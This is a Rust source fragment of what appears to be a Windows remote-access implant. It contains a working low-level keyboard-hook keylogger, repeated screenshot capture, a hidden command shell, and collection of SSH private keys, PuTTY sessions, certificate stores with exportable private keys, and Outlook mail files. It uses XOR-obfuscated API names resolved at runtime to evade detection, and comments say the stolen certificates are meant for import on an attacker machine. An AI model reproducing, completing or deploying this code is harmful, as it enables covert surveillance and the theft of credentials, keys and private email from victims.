        TaskOutput::success(found.join("\n").into_bytes())
    }
}

fn walk_find(dir: &str, pattern: &str, grep: Option<&str>, max: usize, out: &mut Vec<String>) {
    if out.len() >= max { return; }
    use windows_sys::Win32::Foundation::INVALID_HANDLE_VALUE;
    use windows_sys::Win32::Storage::FileSystem::{
        FindFirstFileW, FindNextFileW, FindClose, WIN32_FIND_DATAW, FILE_ATTRIBUTE_DIRECTORY,
    };
    let search_w: Vec<u16> = format!("{dir}\\*\0").encode_utf16().collect();
    let mut fd: WIN32_FIND_DATAW = unsafe { core::mem::zeroed() };
    let h = unsafe { FindFirstFileW(search_w.as_ptr(), &mut fd) };
    if h == INVALID_HANDLE_VALUE { return; }
    loop {
        let nlen = fd.cFileName.iter().position(|&c| c == 0).unwrap_or(260);
        let name = String::from_utf16_lossy(&fd.cFileName[..nlen]);
        if name != "." && name != ".." {
            let full = format!("{dir}\\{name}");
            if fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY != 0 {
                walk_find(&full, pattern, grep, max, out);
            } else if glob_match(pattern, &name) {
                let matches_grep = grep.map(|g| {
                    std::fs::read_to_string(&full).map(|c| c.contains(g)).unwrap_or(false)
                }).unwrap_or(true);
                if matches_grep {
                    out.push(full);
                    if out.len() >= max { break; }
                }
            }
        }
        fd = unsafe { core::mem::zeroed() };
        if unsafe { FindNextFileW(h, &mut fd) } == 0 { break; }
    }
    unsafe { FindClose(h) };
}

fn glob_match(pattern: &str, name: &str) -> bool {
    let name_l = name.to_ascii_lowercase();
    let pat_l  = pattern.to_ascii_lowercase();
    if pat_l.starts_with('*') {
        name_l.ends_with(&pat_l[1..])
    } else if pat_l.ends_with('*') {
        name_l.starts_with(&pat_l[..pat_l.len()-1])
    } else {
        name_l == pat_l
    }
}

// ── Screen recording (timed series of screenshots) ───────────────────────────

#[cfg(target_os = "windows")]
fn collect_screen_record(v: &serde_json::Value) -> TaskOutput {
    let count    = v.get("count").and_then(|n| n.as_u64()).unwrap_or(5) as usize;
    let interval = v.get("interval_ms").and_then(|n| n.as_u64()).unwrap_or(3000);

    let mut frames: Vec<Vec<u8>> = Vec::new();
    for i in 0..count {
        let frame = crate::executor::capture_screenshot();
        frames.push(frame);
        if i + 1 < count {
            std::thread::sleep(std::time::Duration::from_millis(interval));
        }
    }

    use base64::Engine;
    let mut out = String::from("[");
    for (i, frame) in frames.iter().enumerate() {
        if i > 0 { out.push(','); }
        out.push('"');
        out.push_str(&base64::engine::general_purpose::STANDARD.encode(frame));
        out.push('"');
    }
    out.push(']');
    TaskOutput::success(out.into_bytes())
}

// ── Keylogger ─────────────────────────────────────────────────────────────────

static KEYLOG_HOOK:   std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);
static KEYLOG_LOCK:   std::sync::atomic::AtomicBool  = std::sync::atomic::AtomicBool::new(false);
static mut KEYLOG_BUF: Vec<u8> = Vec::new();

#[cfg(target_os = "windows")]
fn keylog_start() -> TaskOutput {
    use std::sync::atomic::Ordering;
    if KEYLOG_HOOK.load(Ordering::SeqCst) != 0 {
        return TaskOutput::failure("keylog: already running");
    }
    std::thread::spawn(keylog_thread);
    // Wait briefly for thread to install hook
    std::thread::sleep(std::time::Duration::from_millis(200));
    if KEYLOG_HOOK.load(Ordering::SeqCst) == 0 {
        TaskOutput::failure("keylog: hook install failed")
    } else {
        TaskOutput::success(b"keylog: started".to_vec())
    }
}

#[cfg(target_os = "windows")]
fn keylog_thread() {
    use std::sync::atomic::Ordering;

    let user32 = crate::loader::get_module_base(
        crate::obfs::dec(&[0x2F,0x3F,0x28,0x3F,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
    );
    if user32 == 0 { return; }

    // "SetWindowsHookExW\0" XOR 0x5A
    let p_set  = unsafe { crate::loader::get_export_by_name(user32, crate::obfs::dec(&[0x09,0x3F,0x2E,0x0D,0x33,0x34,0x3E,0x35,0x2D,0x29,0x12,0x35,0x35,0x31,0x1F,0x22,0x0D,0x5A]).as_ptr()) };
    let p_get  = unsafe { crate::loader::get_export_by_name(user32, crate::obfs::dec(&[0x1D,0x3F,0x2E,0x17,0x3F,0x29,0x29,0x3B,0x3D,0x3F,0x0D,0x5A]).as_ptr()) }; // GetMessageW
    let p_disp = unsafe { crate::loader::get_export_by_name(user32, crate::obfs::dec(&[0x1E,0x33,0x29,0x2A,0x3B,0x2E,0x39,0x12,0x37,0x3F,0x29,0x29,0x3B,0x3D,0x3F,0x0D,0x5A]).as_ptr()) }; // DispatchMessageW
    let p_unhk = unsafe { crate::loader::get_export_by_name(user32, crate::obfs::dec(&[0x0F,0x34,0x32,0x35,0x35,0x31,0x0D,0x33,0x34,0x3E,0x35,0x2D,0x29,0x12,0x35,0x35,0x31,0x1F,0x22,0x5A]).as_ptr()) };

    type SetHookFn = unsafe extern "system" fn(i32, *const u8, isize, u32) -> isize;
    type GetMsgFn  = unsafe extern "system" fn(*mut [u8;48], isize, u32, u32) -> i32;
    type DispFn    = unsafe extern "system" fn(*const [u8;48]) -> isize;
    type UnhookFn  = unsafe extern "system" fn(isize) -> i32;

    let (fn_set, fn_get, fn_disp, fn_unhook) = match (p_set, p_get, p_disp, p_unhk) {
        (Some(a), Some(b), Some(c), Some(d)) => (
            unsafe { core::mem::transmute::<_, SetHookFn>(a) },
            unsafe { core::mem::transmute::<_, GetMsgFn>(b) },
            unsafe { core::mem::transmute::<_, DispFn>(c) },
            unsafe { core::mem::transmute::<_, UnhookFn>(d) },
        ),
        _ => return,
    };

    const WH_KEYBOARD_LL: i32 = 13;
    let hook = unsafe { fn_set(WH_KEYBOARD_LL, keylog_proc as *const u8, 0, 0) };
    if hook == 0 { return; }
    KEYLOG_HOOK.store(hook as usize, Ordering::SeqCst);

    // Message pump
    let mut msg = [0u8; 48];
    while KEYLOG_HOOK.load(Ordering::SeqCst) != 0 {
        let r = unsafe { fn_get(&mut msg, 0, 0, 0) };
        if r <= 0 { break; }
        unsafe { fn_disp(&msg) };
    }
    unsafe { fn_unhook(hook) };
    KEYLOG_HOOK.store(0, Ordering::SeqCst);
}

unsafe extern "system" fn keylog_proc(code: i32, wparam: usize, lparam: isize) -> isize {
    use std::sync::atomic::Ordering;
    const WM_KEYDOWN: usize = 0x0100;
    const HC_ACTION: i32 = 0;

    if code == HC_ACTION && (wparam == WM_KEYDOWN) {
        // lparam points to KBDLLHOOKSTRUCT: vkCode(u32), scanCode(u32), flags(u32), time(u32), dwExtraInfo(usize)
        let vk = unsafe { *(lparam as *const u32) };
        let ch = vk_to_char(vk);
        if !ch.is_empty() {
            // Spin lock
            while KEYLOG_LOCK.compare_exchange(false, true, Ordering::Acquire, Ordering::Relaxed).is_err() {}
            KEYLOG_BUF.extend_from_slice(ch.as_bytes());
            KEYLOG_LOCK.store(false, Ordering::Release);
        }
    }

    // CallNextHookEx — resolve at runtime to avoid IAT
    let user32 = crate::loader::get_module_base(
        crate::obfs::dec(&[0x2F,0x3F,0x28,0x3F,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
    );
    if user32 != 0 {
        let p = crate::loader::get_export_by_name(user32, crate::obfs::dec(&[0x19,0x3B,0x36,0x36,0x14,0x3F,0x22,0x2E,0x12,0x35,0x35,0x31,0x1F,0x22,0x5A]).as_ptr());
        if let Some(p) = p {
            type CallNextFn = unsafe extern "system" fn(isize, i32, usize, isize) -> isize;
            let f: CallNextFn = core::mem::transmute(p);
            let hook = KEYLOG_HOOK.load(Ordering::SeqCst) as isize;
            return f(hook, code, wparam, lparam);
        }
    }
    0
}

fn vk_to_char(vk: u32) -> &'static str {
    match vk {
        0x08 => "[BS]", 0x09 => "\t", 0x0D => "\n",
        0x20 => " ", 0x1B => "[ESC]",
        0x25 => "[LEFT]", 0x26 => "[UP]", 0x27 => "[RIGHT]", 0x28 => "[DOWN]",
        0x2E => "[DEL]",
        0x30..=0x39 => unsafe {
            static DIGITS: &[u8] = b"0123456789";
            core::str::from_utf8_unchecked(&DIGITS[(vk - 0x30) as usize..(vk - 0x30) as usize + 1])
        },
        0x41..=0x5A => unsafe {
            static ALPHA: &[u8] = b"abcdefghijklmnopqrstuvwxyz";
            core::str::from_utf8_unchecked(&ALPHA[(vk - 0x41) as usize..(vk - 0x41) as usize + 1])
        },
        _ => "",
    }
}

fn keylog_stop() -> TaskOutput {
    use std::sync::atomic::Ordering;
    if KEYLOG_HOOK.load(Ordering::SeqCst) == 0 {
        return TaskOutput::failure("keylog: not running");
    }
    KEYLOG_HOOK.store(0, Ordering::SeqCst);
    TaskOutput::success(b"keylog: stopped".to_vec())
}

fn keylog_dump() -> TaskOutput {
    use std::sync::atomic::Ordering;
    while KEYLOG_LOCK.compare_exchange(false, true, Ordering::Acquire, Ordering::Relaxed).is_err() {}
    let data = unsafe { KEYLOG_BUF.clone() };
    unsafe { KEYLOG_BUF.clear() };
    KEYLOG_LOCK.store(false, Ordering::Release);
    if data.is_empty() {
        TaskOutput::success(b"(keylog buffer empty)".to_vec())
    } else {
        TaskOutput::success(data)
    }
}

// ── Helpers ───────────────────────────────────────────────────────────────────

fn shell_run(cmd: &str) -> Result<Vec<u8>, String> {
    use std::os::windows::process::CommandExt;
    const CREATE_NO_WINDOW: u32 = 0x08000000;
    match std::process::Command::new("cmd")
        .args(["/C", cmd])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
    {
        Ok(o)  => { let mut d = o.stdout; d.extend_from_slice(&o.stderr); Ok(d) }
        Err(e) => Err(e.to_string()),
    }
}

// ── SSH key theft ─────────────────────────────────────────────────────────────
//
// Collects private key files from common SSH locations and PuTTY registry.
// Returns JSON: {"files": [{"path": "...", "content_b64": "..."}], "putty_sessions": [...]}

#[cfg(target_os = "windows")]
fn collect_ssh_keys() -> TaskOutput {
    use base64::Engine;

    let mut files: Vec<serde_json::Value> = Vec::new();

    // Common SSH key locations
    let home = std::env::var("USERPROFILE").unwrap_or_else(|_| "C:\\Users\\Administrator".into());
    let search_dirs = [
        format!("{home}\\.ssh"),
        "C:\\ProgramData\\ssh".to_string(),
        format!("{home}\\AppData\\Local\\Temp"),
    ];
    let key_names = ["id_rsa", "id_ecdsa", "id_ed25519", "id_dsa", "id_rsa.pub",
        "id_ecdsa.pub", "id_ed25519.pub", "*.pem", "*.ppk", "*.key"];

    for dir in &search_dirs {
        if let Ok(entries) = std::fs::read_dir(dir) {
            for entry in entries.filter_map(|e| e.ok()) {
                let path = entry.path();
                let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_lowercase();
                let is_key = name.starts_with("id_")
                    || name.ends_with(".pem")
                    || name.ends_with(".ppk")
                    || name.ends_with(".key")
                    || name == "known_hosts"
                    || name == "authorized_keys";
                if is_key {
                    if let Ok(data) = std::fs::read(&path) {
                        let b64 = base64::engine::general_purpose::STANDARD.encode(&data);
                        files.push(serde_json::json!({
                            "path": path.to_string_lossy(),
                            "size": data.len(),
                            "content_b64": b64
                        }));
                    }
                }
            }
        }
    }

    // PuTTY saved sessions from registry (contains hostnames + usernames)
    let putty_sessions = collect_putty_sessions();

    let result = serde_json::json!({
        "ssh_files": files,
        "putty_sessions": putty_sessions
    });

    match serde_json::to_vec(&result) {
        Ok(b)  => TaskOutput::success(b),
        Err(e) => TaskOutput::failure(&e.to_string()),
    }
}

#[cfg(target_os = "windows")]
fn collect_putty_sessions() -> Vec<serde_json::Value> {
    use windows_sys::Win32::System::Registry::{
        RegOpenKeyExA, RegEnumKeyExA, RegQueryValueExA, RegCloseKey,
    };
    const HKCU: isize = -2147483647isize;
    const KEY_READ: u32 = 0x20019;

    let mut sessions = Vec::new();
    let root_path = std::ffi::CString::new("Software\\SimonTatham\\PuTTY\\Sessions").unwrap();
    let mut h_root: isize = 0;
    if unsafe { RegOpenKeyExA(HKCU, root_path.as_ptr() as *const u8, 0, KEY_READ, &mut h_root) } != 0 {
        return sessions;
    }

    let mut idx = 0u32;
    loop {
        let mut name_buf = [0u8; 512];
        let mut name_len = 512u32;
        let r = unsafe { RegEnumKeyExA(h_root, idx, name_buf.as_mut_ptr(), &mut name_len,
            core::ptr::null_mut(), core::ptr::null_mut(), core::ptr::null_mut(), core::ptr::null_mut()) };
        if r != 0 { break; }
        idx += 1;

        let session_name = String::from_utf8_lossy(&name_buf[..name_len as usize]).to_string();
        let sub = std::ffi::CString::new(
            format!("Software\\SimonTatham\\PuTTY\\Sessions\\{session_name}")
        ).unwrap();
        let mut h_sess: isize = 0;
        if unsafe { RegOpenKeyExA(HKCU, sub.as_ptr() as *const u8, 0, KEY_READ, &mut h_sess) } != 0 { continue; }

        let mut read_val = |name: &str| -> String {
            let n = std::ffi::CString::new(name).unwrap();
            let mut buf = vec![0u8; 256];
            let mut len = buf.len() as u32;
            let mut typ = 0u32;
            if unsafe { RegQueryValueExA(h_sess, n.as_ptr() as *const u8, core::ptr::null_mut(),
                &mut typ, buf.as_mut_ptr(), &mut len) } != 0 { return String::new(); }
            String::from_utf8_lossy(&buf[..len.saturating_sub(1) as usize]).to_string()
        };

        let hostname  = read_val("HostName");
        let username  = read_val("UserName");
        let port      = read_val("PortNumber");
        let key_file  = read_val("PublicKeyFile");
        unsafe { RegCloseKey(h_sess) };

        sessions.push(serde_json::json!({
            "session": session_name,
            "host": hostname,
            "user": username,
            "port": port,
            "key_file": key_file
        }));
    }

    unsafe { RegCloseKey(h_root) };
    sessions
}

// ── Certificate theft ─────────────────────────────────────────────────────────
//
// Enumerates MY, CA, ROOT cert stores and exports each as a PFX blob
// (includes private keys where exportable). Returns JSON with per-store
// cert metadata + base64-encoded PFX for import on attacker machine.

#[cfg(target_os = "windows")]
fn collect_certs() -> TaskOutput {
    use base64::Engine;
    use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;

    let crypt32 = {
        let mut base = crate::loader::get_module_base(
            crate::obfs::dec(&[0x39,0x28,0x23,0x2A,0x2E,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]).as_ptr()
        ) as isize;
        if base == 0 {
            let name = crate::obfs::dec(&[0x39,0x28,0x23,0x2A,0x2E,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]);
            base = unsafe { LoadLibraryA(name.as_ptr()) } as isize;
        }
        if base == 0 { return TaskOutput::failure("certs: crypt32 not found"); }
        base as usize
    };

    // CertOpenSystemStoreA, CertEnumCertificatesInStore, CertGetNameStringA,
    // CertCloseStore, PFXExportCertStoreEx
    type CertOpenFn    = unsafe extern "system" fn(usize, *const u8) -> isize;
    type CertEnumFn    = unsafe extern "system" fn(isize, *const u8) -> *const u8;
    type CertNameFn    = unsafe extern "system" fn(*const u8, u32, u32, *const u8, *mut u8, u32) -> u32;
    type CertCloseFn   = unsafe extern "system" fn(isize, u32) -> i32;
    type PfxExportFn   = unsafe extern "system" fn(isize, *mut u8, *const u16, *const u8, u32) -> i32;

    macro_rules! load_fn { ($enc:expr, $ty:ty) => { {
        match unsafe { crate::loader::get_export_by_name(crypt32, crate::obfs::dec($enc).as_ptr()) } {
            Some(p) => unsafe { core::mem::transmute::<_, $ty>(p) },
            None    => return TaskOutput::failure("certs: fn resolve failed"),
        }
    }}}

    // CertOpenSystemStoreA
    let fn_open = load_fn!(&[0x19,0x3F,0x28,0x2E,0x15,0x2A,0x3F,0x34,0x09,0x23,0x29,0x2E,
                              0x3F,0x37,0x09,0x2E,0x35,0x28,0x3F,0x1B,0x5A], CertOpenFn);
    // CertEnumCertificatesInStore
    let fn_enum = load_fn!(&[0x19,0x3F,0x28,0x2E,0x1F,0x34,0x2F,0x37,0x19,0x3F,0x28,0x2E,
                              0x33,0x3C,0x33,0x39,0x3B,0x2E,0x3F,0x29,0x13,0x34,0x09,0x2E,
                              0x35,0x28,0x3F,0x5A], CertEnumFn);
    // CertGetNameStringA
    let fn_name = load_fn!(&[0x19,0x3F,0x28,0x2E,0x1D,0x3F,0x2E,0x14,0x3B,0x37,0x3F,0x09,
                              0x2E,0x28,0x33,0x34,0x3D,0x1B,0x5A], CertNameFn);
    // CertCloseStore
    let fn_close = load_fn!(&[0x19,0x3F,0x28,0x2E,0x19,0x36,0x35,0x29,0x3F,0x09,0x2E,0x35,
                               0x28,0x3F,0x5A], CertCloseFn);
    // PFXExportCertStoreEx
    let fn_pfx = load_fn!(&[0x0A,0x1C,0x02,0x1F,0x22,0x2A,0x35,0x28,0x2E,0x19,0x3F,0x28,
                             0x2E,0x09,0x2E,0x35,0x28,0x3F,0x1F,0x22,0x5A], PfxExportFn);

    let mut stores_out: Vec<serde_json::Value> = Vec::new();

    for store_name in ["MY", "CA", "ROOT"] {
        let sname: Vec<u8> = store_name.bytes().chain(core::iter::once(0)).collect();
        let hstore = unsafe { fn_open(0usize, sname.as_ptr()) };
        if hstore == 0 { continue; }

        // Enumerate for metadata. CERT_CONTEXT x64 layout:
        //   +0  u32  dwCertEncodingType
        //   +4  [4]  pad
        //   +8  *u8  pbCertEncoded
        //   +16 u32  cbCertEncoded
        //   +20 [4]  pad
        //   +24 *u8  pCertInfo
        //   +32 isize hCertStore
        let mut certs_meta: Vec<serde_json::Value> = Vec::new();
        let mut ctx = core::ptr::null::<u8>();
        loop {
            ctx = unsafe { fn_enum(hstore, ctx) }; // frees previous ctx
            if ctx.is_null() { break; }

            let enc_ptr = unsafe { *(ctx.add(8)  as *const *const u8) };
            let enc_len = unsafe { *(ctx.add(16) as *const u32) };

            let mut subj_buf = [0u8; 512];
            let ns = unsafe { fn_name(ctx, 4, 0, core::ptr::null(), subj_buf.as_mut_ptr(), 512) };
            let subject = String::from_utf8_lossy(
                &subj_buf[..ns.saturating_sub(1) as usize]
            ).to_string();

            let mut issr_buf = [0u8; 512];
            let ni = unsafe { fn_name(ctx, 4, 1, core::ptr::null(), issr_buf.as_mut_ptr(), 512) };
            let issuer = String::from_utf8_lossy(
                &issr_buf[..ni.saturating_sub(1) as usize]
            ).to_string();

            let der_b64 = if !enc_ptr.is_null() && enc_len > 0 {
                let der = unsafe { core::slice::from_raw_parts(enc_ptr, enc_len as usize) };
                base64::engine::general_purpose::STANDARD.encode(der)
            } else { String::new() };

            certs_meta.push(serde_json::json!({
                "subject":     subject,
                "issuer":      issuer,
                "cert_der_b64": der_b64
            }));
        }

        // CRYPT_DATA_BLOB x64: u32 cb (+0), [4] pad, *mut u8 pb (+8) → 16 bytes total
        // Two-phase: first call gets required size, second fills the buffer.
        let pw: Vec<u16> = core::iter::once(0u16).collect(); // empty password
        let mut blob = [0u8; 16usize];
        unsafe { fn_pfx(hstore, blob.as_mut_ptr(), pw.as_ptr(), core::ptr::null(), 0x0004) };
        let cb = u32::from_ne_bytes([blob[0], blob[1], blob[2], blob[3]]);
        let pfx_b64 = if cb > 0 {
            let mut buf = vec![0u8; cb as usize];
            unsafe {
                *(blob.as_mut_ptr().add(8) as *mut *mut u8) = buf.as_mut_ptr();
                fn_pfx(hstore, blob.as_mut_ptr(), pw.as_ptr(), core::ptr::null(), 0x0004);
            }
            base64::engine::general_purpose::STANDARD.encode(&buf)
        } else { String::new() };

        unsafe { fn_close(hstore, 0) };

        stores_out.push(serde_json::json!({
            "store":       store_name,
            "cert_count":  certs_meta.len(),
            "certs":       certs_meta,
            "pfx_b64":     pfx_b64
        }));
    }

    let out = serde_json::to_vec(&serde_json::json!({"stores": stores_out}))
        .unwrap_or_default();
    TaskOutput::success(out)
}

// ── Email collection ──────────────────────────────────────────────────────────
//
// Walks common Outlook data file locations and returns an inventory of
// .pst/.ost/.nst files with paths and sizes. Use the file module to pull
// individual files for offline analysis.

#[cfg(target_os = "windows")]
fn collect_email() -> TaskOutput {
    let local_app    = std::env::var("LOCALAPPDATA").unwrap_or_default();
    let appdata      = std::env::var("APPDATA").unwrap_or_default();
    let userprofile  = std::env::var("USERPROFILE").unwrap_or_default();

    let roots = [
        format!("{local_app}\\Microsoft\\Outlook"),
        format!("{appdata}\\Microsoft\\Outlook"),
        format!("{userprofile}\\Documents\\Outlook Files"),
        format!("{userprofile}\\My Documents\\Outlook Files"),
    ];

    let mut files: Vec<serde_json::Value> = Vec::new();
    for root in &roots {
        walk_email(std::path::Path::new(root), &mut files, 4);
    }

    let out = serde_json::to_vec(&serde_json::json!({"email_files": files}))
        .unwrap_or_default();
    TaskOutput::success(out)
}

#[cfg(target_os = "windows")]
fn walk_email(dir: &std::path::Path, out: &mut Vec<serde_json::Value>, depth: u32) {
    if depth == 0 { return; }
    let Ok(entries) = std::fs::read_dir(dir) else { return };
    for entry in entries.filter_map(|e| e.ok()) {
        let path = entry.path();
        if path.is_dir() {
            walk_email(&path, out, depth - 1);
        } else {
            let name = path.file_name()
                .and_then(|n| n.to_str())
                .unwrap_or("")
                .to_lowercase();
            if name.ends_with(".pst") || name.ends_with(".ost") || name.ends_with(".nst") {
                let size = std::fs::metadata(&path).map(|m| m.len()).unwrap_or(0);
                let kind = if name.ends_with(".pst") { "PST" }
                    else if name.ends_with(".ost") { "OST" }
                    else { "NST" };
                out.push(serde_json::json!({
                    "path":       path.to_string_lossy(),
                    "size_bytes": size,
                    "type":       kind
                }));
            }
        }
    }
}
